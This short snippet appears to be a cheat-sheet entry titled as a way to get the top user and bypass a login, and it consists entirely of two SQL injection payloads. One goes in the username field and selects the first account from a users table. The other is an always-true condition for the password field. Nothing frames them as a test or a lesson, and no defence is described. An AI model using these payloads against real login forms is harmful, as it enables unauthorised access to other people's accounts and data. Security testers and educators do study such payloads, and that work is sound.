Getting top user and bypassing login (easy)
```sql
# User field
' OR username = (SELECT TOP 1 username FROM users) --
# Pass field
' OR 1 = 1 --
```
